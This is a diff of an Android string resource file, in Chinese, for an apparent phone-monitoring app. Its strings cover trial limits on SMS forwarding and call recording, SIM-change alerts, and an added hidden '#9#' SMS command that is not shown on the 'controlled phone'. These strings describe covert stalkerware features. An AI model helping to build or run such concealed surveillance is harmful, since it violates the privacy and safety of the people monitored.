@@ -157,7 +157,7 @@
     <string name="msg_sms_times_over_in_trial">安卓监控提醒您：试用期转发短信已经达到10条，如需继续使用请联系</string>
     <string name="msg_recording_times_over_in_trial">安卓监控提醒您：试用期通话录音已经达到5次，如需继续使用请联系</string>
     <string name="msg_changed_sim">安卓监控提醒：%s更换了手机卡。</string>
-    <string name="msg_changed_sim_new_number_trial">本短信手机号码即为新号码。</string>
+    <string name="msg_changed_sim_new_number_workaround">本短信手机号码即为新号码。请发送#9#加该新号码到被控手机进行确认（该短信不会在被控手机上显示）</string>
     <string name="msg_changed_sim_new_number">新卡号码为：%s</string>
     <string name="msg_trial_expire_or_not_licensed">安卓监控提醒您：试用期已过或未注册，无法打开设置界面。</string>
     
